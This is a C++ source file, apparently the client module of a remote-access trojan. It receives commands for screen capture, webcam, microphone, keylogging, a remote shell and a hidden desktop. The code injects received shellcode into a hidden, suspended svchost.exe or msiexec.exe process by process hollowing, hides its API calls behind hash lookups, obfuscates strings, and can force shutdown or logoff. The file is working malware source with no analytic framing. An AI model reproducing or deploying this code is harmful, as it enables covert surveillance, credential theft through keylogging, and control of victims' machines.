#include "KernelManager.h"
#include"Install.h"
#include <tchar.h>
#include"../../PublicInclude/until.h"

MODIFY_DATA CKernelManager::modify_data = { 0, };

CKernelManager::CKernelManager(CClientSocket* pClient, MODIFY_DATA m_data) : CManager(pClient)
{
	memcpy(&modify_data, &m_data, sizeof(MODIFY_DATA));
	m_nThreadCount = 0;
	m_bIsActived = false;
}

CKernelManager::~CKernelManager()
{
	for (UINT i = 0; i < m_nThreadCount; i++)
	{
		TerminateThread(m_hThread[i], -1);
		CloseHandle(m_hThread[i]);
	}
}

// ���ϼ���
void CKernelManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	switch (lpBuffer[0])
	{
		case COMMAND_ACTIVED:										// ����˿��Լ��ʼ����
			InterlockedExchange((LONG*)&m_bIsActived, true);
			break;
		case COMMAND_LIST_DRIVE:									// �ļ�����
		case COMMAND_SCREEN_SPY:									// ��Ļ�鿴
		case COMMAND_WEBCAM:										//����ͷ
		case COMMAND_AUDIO:											//��˷�
		case COMMAND_SHELL:											// Զ��sehll
		case COMMAND_REGEDIT:										//ע������
		case COMMAND_SERMANAGER:									//�������
		case COMMAND_SPEAKER:										//������
		case COMMAND_SYSTEM:										//ϵͳ����
		case COMMAND_SYSINFO:										//��������
		case COMMAND_TASK:											//�ƻ�����
		case COMMAND_KEYBOARD:										//���̼�¼
		case COMMAND_DESKTOP:										//��̨����
		case COMMAND_GN:											//ʵ�ù���
		case COMMAND_OLDPINGMU:										//�򿪾ɰ�����
		{
			PBYTE hMemDll = (PBYTE)VirtualAlloc(0, nSize - 1, MEM_COMMIT | MEM_RESERVE, 0x4);
			if (hMemDll == NULL)
				break;
			if (nSize - 1 == 0)
				break;
			memcpy(hMemDll, lpBuffer + 1, nSize - 1);
			m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_Door, (LPVOID)(hMemDll), 0, NULL, true);		
		}
		break;
		case COMMAND_UPDATACLIENT:									//�ͻ��˸���
		{
			PBYTE hMemDll = (PBYTE)LocalAlloc(LPTR, nSize - 1);
			if (hMemDll == NULL)
				break;
			memcpy(hMemDll, lpBuffer + 1, nSize - 1);
			m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_Updata, (LPVOID)(hMemDll), 0, NULL, true);
			break;
		}
		case COMMAND_SESSION:					//�ػ�������ע��
		{
			DebugPrivilege(SE_SHUTDOWN_NAME, TRUE);
			ExitWindowsEx(lpBuffer[1], 0);
			DebugPrivilege(SE_SHUTDOWN_NAME, FALSE);
			break;
		}	
		case COMMAND_REMOVE:					//ж��
			UnInstallService(modify_data);
			break;
		case COMMAND_REPLAY_HEARTBEAT:// �ظ�������
			//m_pClient->nHeartBeatCount++;
			break;
		case COMMAND_REMARK:			//���ñ�ע
			EditMark(lpBuffer);
			break;

	}
}


void CKernelManager::EditMark(LPBYTE lpBuffer)
{
	char* data = (char*)&lpBuffer[1];
	HKEY   hKey;
	if (RegCreateKeyA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft", &hKey) == ERROR_SUCCESS)
	{
		RegSetValueExA(hKey, "Mark", 0, REG_SZ, (LPBYTE)data, strlen(data) + 1);
		RegCloseKey(hKey);
	}

}

void CKernelManager::UnInstallService(MODIFY_DATA modify_data)
{

	ExitProcess(NULL);
}

bool CKernelManager::IsActived()
{
	return	m_bIsActived;	
}

BOOL WINAPI CKernelManager::Loop_Door(LPVOID lparam)
{
	LoadFromShellcode(lparam, CKernelManager::modify_data, NULL);
	return TRUE;
}

BOOL WINAPI CKernelManager::Loop_Updata(LPVOID lparam)
{

	char svchost[] = { '\\','s','v','c',0,'o','s',0,'.','e','x','e',0 };
	svchost[4] = 'h';
	svchost[7] = 't';
	BOOL rt = PuppetProcess(svchost, lparam, LocalSize(lparam));
	LocalFree(lparam);
	return TRUE;
}
BOOL CKernelManager::LoadFromShellcode(LPVOID data, MODIFY_DATA modify_data, LPBYTE lpBuffer)
{
	BOOL rt = FALSE;
	ShellcodeStr* m_ShellcodeStr = (ShellcodeStr*)data;
	memcpy(&m_ShellcodeStr->modify_data, &modify_data, sizeof(MODIFY_DATA));
	char svchost[] = { '\\','s','v','c',0,'o','s',0,'.','e','x','e',0 };
	svchost[4] = 'h';
	svchost[7] = 't';
	rt = PuppetProcess(svchost, m_ShellcodeStr, sizeof(ShellcodeStr));
	VirtualFree(m_ShellcodeStr, 0, MEM_RELEASE);
	return rt;
}

BOOL CKernelManager::PuppetProcess(TCHAR* pszFilePath, PVOID pReplaceData, DWORD dwReplaceDataSize)
{
	
	MyWriteProcessMemory pWriteProcessMemory = (MyWriteProcessMemory)MyGetProcAddress(GetKernel32Base(), 0xfdcf5dcf);
	MyVirtualAllocEx pVirtualAllocEx = (MyVirtualAllocEx)MyGetProcAddress(GetKernel32Base(), 0x250fb903);
	MyCreateRemoteThread pCreateRemoteThread = (MyCreateRemoteThread)MyGetProcAddress(GetKernel32Base(), 0xd5a771d4);
	char name[MAX_PATH] = { 'c',':','\\','w','i','n','d','o','w','s','\\','S','y','s','W','O','W','6','4',{0} };
	if (!pWriteProcessMemory || !pVirtualAllocEx || !pCreateRemoteThread)
	{
		return FALSE;
	}

	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION pi = { 0 };
	BOOL bRet = FALSE;
	ZeroMemory(&si, sizeof(si));
	ZeroMemory(&pi, sizeof(pi));
	si.lpReserved = NULL;
	si.lpDesktop = NULL;
	si.lpTitle = NULL;
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;
	si.cb = sizeof(si);
	_tcscat(name, pszFilePath); //��������ǲ����ܴ�ġ���
	bRet = CreateProcess(NULL, name, NULL, NULL, FALSE, CREATE_NEW_PROCESS_GROUP | CREATE_NEW_CONSOLE | CREATE_SUSPENDED, NULL, NULL, &si, &pi);
	if (FALSE == bRet)
	{
		TCHAR szmsiexecPath[MAX_PATH] = { 0, };
		GetSystemWow64Directory(szmsiexecPath, MAX_PATH);
		_tcscat(szmsiexecPath, _T("\\msiexec.exe -baidu")); //��������ǲ����ܴ�ġ���
		bRet = CreateProcess(NULL, szmsiexecPath, NULL, NULL, FALSE, CREATE_NEW_PROCESS_GROUP | CREATE_NEW_CONSOLE | CREATE_SUSPENDED, NULL, NULL, &si, &pi);
		if (FALSE == bRet)
		{
			CloseHandle(pi.hThread);
			CloseHandle(pi.hProcess);
			return FALSE;
		}
	}

	SuspendThread(pi.hProcess);

	LPVOID lpDestBaseAddr = pVirtualAllocEx(pi.hProcess, NULL, dwReplaceDataSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (NULL == lpDestBaseAddr)
	{
		return FALSE;
	}

	// д���滻������
	bRet = pWriteProcessMemory(pi.hProcess, lpDestBaseAddr, pReplaceData, dwReplaceDataSize, NULL);

	if (FALSE == bRet)
	{
		return FALSE;
	}

	pCreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpDestBaseAddr, lpDestBaseAddr, 0, NULL);
	return TRUE;

}
